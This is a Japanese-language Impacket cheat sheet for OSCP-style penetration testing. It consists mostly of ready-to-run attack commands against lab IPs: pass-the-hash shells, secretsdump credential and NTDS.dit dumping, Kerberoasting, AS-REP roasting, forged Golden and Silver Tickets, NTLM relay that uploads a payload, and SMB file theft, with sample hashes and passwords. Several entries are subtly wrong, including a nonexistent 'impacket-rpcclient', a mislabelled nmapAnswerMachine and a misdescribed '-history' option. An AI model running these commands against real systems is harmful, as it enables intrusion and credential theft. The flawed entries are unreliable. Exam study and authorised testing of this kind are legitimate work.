# impacket

## 🎯 概要
**Impacket** は、ネットワークプロトコル（SMB、MSRPC、LDAP、Kerberos 等）を操作するための Python クラスの強力なコレクションです。ペネトレーションテストや OSCP において、Windows および Active Directory（AD）環境の攻略には欠かせない「標準ツールセット」です。低レイヤーでのパケット操作を可能にするため、既存の脆弱性スキャナでは対応できない複雑な認証情報の操作、リモートコマンド実行、認証リレー攻撃などを、個別の Python スクリプト（例：`psexec.py`, `secretsdump.py`）を通じて実行できます。

---

## 🛠 代表的な用途
- **リモートコマンド実行（RCE）**: 有効な認証情報（パスワードやハッシュ）を用いて、ターゲット上でインタラクティブなシェルを取得。
- **認証情報のダンプ**: SAM データベース、LSA シークレット、およびドメインコントローラの NTDS.dit からハッシュを抽出。
- **Active Directory 攻撃**: Kerberoasting、AS-REP Roasting、チケット偽装（Golden/Silver Ticket）の実行。
- **認証リレー**: NTLM 認証をキャプチャし、別のホストへリレーして実行権限を奪取。
- **OSCP での利用ポイント**: AD セットの攻略において、Metasploit を使用せずに手動でシェルを取得し、横展開（Lateral Movement）を行う際の主力ツールとなります。

---

## 🔍 基本コマンド
```bash
# SMB 共有を介したインタラクティブなシェル取得
impacket-psexec administrator@10.10.10.1

# 有効な資格情報を用いてリモートからパスワードハッシュをダンプ
impacket-secretsdump -hashes :7a38310ea6f0027ee955abed1762964b Administrator@10.10.10.1

# 認証なしで（または一般ユーザーで）AS-REP Roasting を実行
impacket-GetNPUsers corp.com/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10
```

---

## 🧪 よく使う攻撃シナリオ
- **Pass-the-Hash による管理者奪取**: 入手した管理者ハッシュをそのまま `wmiexec.py` や `psexec.py` に渡し、パスワードを知ることなく SYSTEM 権限のシェルを取得します。
- **Kerberoasting によるサービスアカウントのパスワード解析**: `GetUserSPNs.py` を使用して、サービスアカウントのチケット（TGS）を要求し、オフラインでパスワードを解析します。
- **NTLM Relay 攻撃による侵入**: `ntlmrelayx.py` を起動し、Responder 等で誘導した認証トラフィックを SMB 署名が無効なホストへリレーしてシェルを起動させます。

---

## 📌 フェーズ別コマンド例  
Pentest‑Playbook の各フェーズで実際に使うコマンド例を記載します。  
書式は **「# 説明 → コマンド例」** の形式で統一します。

---

### 🔎 Reconnaissance（技術的偵察）
```bash
# RPC エンドポイントをダンプして稼働しているインターフェースを確認
impacket-rpcdump 10.10.10.1

# ターゲット上で動作しているサービスのバージョン情報を特定
impacket-rpcdump 10.10.10.1 | grep -i "MS-RPRN"

# 匿名セッションで RPC ポート（135）から詳細なシステム情報を取得
impacket-rpcdump -p 135 10.10.10.1
```

---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# SID サイクルにより、認証なし（Null Session）でドメインユーザーを列挙
impacket-lookupsid corp.com/guest@10.10.10.1

# SAM データベースのリモート調査を行い、ユーザーやグループ情報を取得
impacket-samrdump corp.com/user:password@10.10.10.1

# 指定した IP 範囲に対して、NetBIOS 名解決をスイープ実行
impacket-nmapAnswerMachine 10.10.10.0/24

# SMB プロトコルを介してターゲットの共有一覧を対話的に調査
impacket-smbclient corp.com/user:password@10.10.10.1
```

---

### 🚪 Initial Access（初期侵入）
```bash
# Pre-authentication が不要なユーザーを特定し、AS-REP ハッシュを取得
impacket-GetNPUsers corp.com/pete:Nexus123! -request -dc-ip 10.10.10.10

# NTLM リレー攻撃の待ち受けを行い、ヒット時に指定した実行ファイルをアップロード
impacket-ntlmrelayx -tf targets.txt -e payload.exe

# MSSQL サービスの脆弱な資格情報を用いて、OS コマンド実行（xp_cmdshell）を試行
impacket-mssqlclient -windows-auth corp.com/user:password@10.10.10.1
```

---

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# 侵入済みのホスト上で、LSA シークレットから認証情報（サービスアカウント等）を抽出
impacket-secretsdump -local LOCAL

# ターゲットホストに保存されているキャッシュ済みのドメイン資格情報をダンプ
impacket-secretsdump -history LOCAL
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# ドメインコントローラーから NTDS.dit の全ハッシュを VSS 経由でリモートダンプ
impacket-secretsdump -just-dc -hashes :7a38310ea6f0027ee955abed1762964b Administrator@10.10.10.100

# 特定のドメインユーザー（例：dave）のハッシュのみをピンポイントで取得
impacket-secretsdump -just-dc-user dave corp.com/admin:pass@10.10.10.100

# サービスプリンシパル名（SPN）を持つユーザーのハッシュを Kerberoasting で取得
impacket-GetUserSPNs corp.com/user:password -request -outputfile hashes.kerberoast

# 取得したオフラインの NTDS.dit ファイルと SYSTEM レジストリからハッシュを抽出
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

### 📈 Privilege Escalation（権限昇格）
```bash
# 奪取した低権限ユーザーを用いて、管理者グループへの権限昇格が可能か RPC 経由で確認
impacket-rpcclient -U corp.com/user%password 10.10.10.1 -c "enumprivs"

# DCOM インターフェースを利用して、SYSTEM 権限でのコマンド実行を試行
impacket-dcomexec -hashes :<hash> Administrator@10.10.10.1 "whoami"
```

---

### 🏢 Active Directory（AD）
```bash
# 特定のユーザーになりすますための Golden Ticket (TGT) を生成
impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <sid> -domain corp.com user_name

# 特定のサービスを利用するための Silver Ticket (TGS) を生成
impacket-ticketer -nthash <service_ntlm_hash> -domain-sid <sid> -domain corp.com -spn <service_spn> user_name

# 有効なハッシュを用いて TGT を要求し、Kirbi/CCache 形式で保存（Overpass-the-Hash）
impacket-getTGT -hashes :7a38310ea6f0027ee955abed1762964b corp.com/administrator
```

---

### 🚀 Lateral Movement（横展開）
```bash
# WMI を利用したセミインタラクティブなシェル取得（検知されにくく OSCP で推奨）
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@10.10.10.2

# SMBExec を利用して、サービス作成を介した非対話的なコマンド実行
impacket-smbexec Administrator@10.10.10.2

# 取得したチケットファイル（ccache）を使用して、Kerberos 認証で他ホストへアクセス
export KRB5CCNAME=admin.ccache; impacket-wmiexec -k -no-pass corp.com/admin@target_host
```

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# Proxychains と組み合わせて、内部ネットワークの SMB 共有をブラウズ
proxychains impacket-smbclient corp.com/user:password@172.16.5.10
```

---

## 🧰 便利オプション一覧
- `-hashes [LM:NT]`：パスワードの代わりに NTLM ハッシュ（Pass-the-Hash）を使用します。LM がない場合は `:NT` の形式。
- `-k`：NTLM 認証の代わりに Kerberos 認証を使用します。
- `-no-pass`：パスワードを要求せず、チケット（ccache）等を利用して認証します。
- `-dc-ip <IP>`：ドメインコントローラの IP アドレスを明示的に指定します。
- `-request`：AD 関連ツールでチケットやハッシュの取得を要求します。
- `-just-dc`：secretsdump 等で、ドメイン全体ではなく DC 関連の機密情報のみに絞ります。
- `-outputfile <file>`：結果を指定したファイルに出力します。

---

## 🚀 実践例

```bash
# 【1】OSCP の典型：入手した管理者ハッシュで SYSTEM シェルを獲得
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

# 【2】一般ユーザーの資格情報から、サービスアカウントのパスワードハッシュを収集（Kerberoasting）
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/john:dqsTwTpZPn#nL -outputfile krb_hashes.txt

# 【3】ドメイン管理者権限取得後、DC から全ユーザーのハッシュを一括奪取
impacket-secretsdump -just-dc corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.50.70

# 【4】SMB 共有内のファイルを探索し、機密ファイルをダウンロード
impacket-smbclient corp.com/guest@192.168.50.150 -N
# smb: \> use Public
# smb: \Public\> get passwords.txt

# 【5】Proxychains を介して、内部セグメントの DC からユーザー SID を特定
proxychains impacket-lookupsid -no-pass -domain-sid S-1-5-21-1987370270-658905905-1781884369 corp.com/user@172.16.6.240
```

---

## 🧩 他ツールとの組み合わせ
- **ffuf / Gobuster** → Web サイトの列挙で見つかったユーザー名やパスワードを `GetNPUsers.py` や `wmiexec.py` の辞書として利用。
- **NetExec (nxc)** → 大規模ネットワークで `nxc smb <range> --shares` により「WRITE」権限があるホストを特定後、`psexec.py` で侵入。
- **Responder** → Responder でキャプチャしたハッシュが解析できない場合、そのトラフィックを `ntlmrelayx.py` に流して無署名 SMB ホストを自動攻略。
- **John the Ripper / Hashcat** → `GetUserSPNs.py` や `secretsdump.py` で得たハッシュをオフラインで解析し、平文パスワードを復元。

---

## 📝 注意点（OSCP 試験での使い方）
- **ツールの挙動の違い**: `psexec.py` はターゲットにサービスをインストールし、バイナリをアップロードするため、アンチウイルス（AV）に検知されやすいです。一方、`wmiexec.py` は WMI を利用するため、よりステルス性が高く、OSCP 試験環境でも推奨されます。
- **後片付け**: `psexec.py` や `smbexec.py` を使用した後は、作成された一時的なサービスやファイルが残っていないか確認が必要です（Impacket は通常自動でクリーンアップを試みますが、異常終了時は手動確認を推奨）。
- **依存関係**: インストールは `pip install impacket` ですが、OSCP の Kali 環境にはデフォルトで入っています。`/usr/bin/impacket-*` のエイリアスが便利です。

---

## 🔗 参考リンク
- 公式：[Impacket GitHub Repository](https://github.com/fortra/impacket)
- 公式例：[Impacket Examples Documentation](https://github.com/fortra/impacket/tree/master/examples)
- 良質解説：[Impacket Tools Cheat Sheet (HackTricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/impacket-tools)
